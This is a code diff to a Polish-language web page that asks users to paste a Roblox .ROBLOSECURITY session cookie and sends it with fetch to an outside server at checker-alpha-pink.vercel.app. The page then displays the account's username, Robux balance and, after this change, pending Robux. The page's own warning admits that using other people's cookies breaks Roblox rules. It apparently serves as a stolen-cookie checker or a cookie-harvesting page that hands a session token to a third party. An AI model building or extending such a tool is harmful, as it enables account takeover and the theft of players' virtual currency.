@@ -52,10 +52,10 @@
 </head>
 <body>
 
-<h2>Pobierz nazwę użytkownika Roblox z cookie</h2>
+<h2>Pobierz dane z .ROBLOSECURITY</h2>
 
 <p style="color:#ffcc00; font-weight:bold;">
-  <strong>OSTRZEŻENIE:</strong> używanie cudzych cookie jest niezgodne z regulaminem Roblox i może skutkować banem
+  <strong>OSTRZEŻENIE:</strong> używanie cudzych cookie jest niezgodne z regulaminem Roblox i prowadzi do bana konta
 </p>
 
 <textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
@@ -76,7 +76,7 @@ async function sprawdz() {
     return;
   }
 
-  result.innerHTML = '<i>Proszę czekać... trwa weryfikacja</i>';
+  result.innerHTML = '<i>Proszę czekać... weryfikacja + sprawdzanie transakcji</i>';
 
   try {
     const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
@@ -106,7 +106,12 @@ async function sprawdz() {
         <b>Robux na koncie:</b> 
           <span style="color: #ffcc00; font-weight: bold;">
             ${json.robux.toLocaleString('pl-PL')} Robux
+          </span><br>
+        <b>Pending Robux (oczekujące):</b> 
+          <span style="color: #ffaa00; font-weight: bold;">
+            ${json.pendingRobux.toLocaleString('pl-PL')} Robux
           </span>
+          <small style="color:#888;"> (głównie z sprzedaży, może nie być 100% kompletne)</small>
       `;
     } else {
       result.innerHTML = '<span class="error">Nieznana odpowiedź serwera</span>';
